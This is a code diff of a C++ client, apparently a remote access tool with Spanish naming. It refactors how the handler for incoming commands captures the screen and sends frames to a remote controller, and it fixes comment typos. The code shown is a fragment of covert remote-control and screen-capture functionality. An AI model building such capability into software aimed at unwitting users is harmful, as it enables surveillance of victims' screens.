@@ -754,34 +754,17 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
                 this->mod_dynamic->GDIPLUS_RD,
                 this->mod_dynamic->OLE32);
         }
-        //Si estra creado pero si no se esta en modo live
+        //Si esta creado pero si no se esta en modo live
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
             strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
             if (strIn.size() == 2) {
-                ULONG iQuality = static_cast<ULONG>(atoi(strIn[0].c_str()));
+                ULONG uQuality = static_cast<ULONG>(atoi(strIn[0].c_str()));
                 int iMonitorIndex = atoi(strIn[1].c_str());
-                _DBG_("Enviando captura de pantalla. Index:", iMonitorIndex);
-                _DBG_("Calidad:", iQuality);
-                //std::shared_ptr<Gdiplus::Bitmap> bitmapBits = this->mod_RemoteDesk->getFrameBitmap(iQuality, iMonitorIndex);
-                Gdiplus::Bitmap* bitmapBits = this->mod_RemoteDesk->getFrameBitmap(iQuality, iMonitorIndex);
-                if (bitmapBits != nullptr) {
-                    std::vector<char> vcDeskBuffer = this->mod_RemoteDesk->getBitmapBytes(bitmapBits, iQuality);
-                    int iBufferSize = vcDeskBuffer.size();
-                    if (iBufferSize > 0) {
-                        this->cChunkSend(this->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
-                    }
-                    else {
-                        __DBG_("El buffer de remote_desk es 0");
-                    }
-                    this->mod_dynamic->GDIPLUS_RD.pGdipDisposeImage(reinterpret_cast<Gdiplus::Image*>(bitmapBits));
-                }
-                else {
-                    __DBG_("[RD] Error obteniendo el frame");
-                }
-                
+
+                this->mod_RemoteDesk->EnviarCaptura(uQuality, iMonitorIndex);
             }
         }else {
-            __DBG_("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta enviando las imagenes");
+            __DBG_("No se pudo reservar memoria para el modulo de escritorio remoto o ya esta en modo live");
         }
         return;
     }
@@ -799,12 +782,12 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         if (this->mod_RemoteDesk) {
             strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
             if (strIn.size() == 2) {
-                int iQuality = atoi(strIn[0].c_str());
+                ULONG uQuality = static_cast<ULONG>(atoi(strIn[0].c_str()));
                 int iMonitorIndex = atoi(strIn[1].c_str());
                 _DBG_("Empezando live de pantalla. Index:", iMonitorIndex);
-                _DBG_("Calidad:", iQuality);
+                _DBG_("Calidad:", uQuality);
 
-                this->mod_RemoteDesk->SpawnThread(iQuality, iMonitorIndex);
+                this->mod_RemoteDesk->SpawnThread(uQuality, iMonitorIndex);
             }
         }
         return;
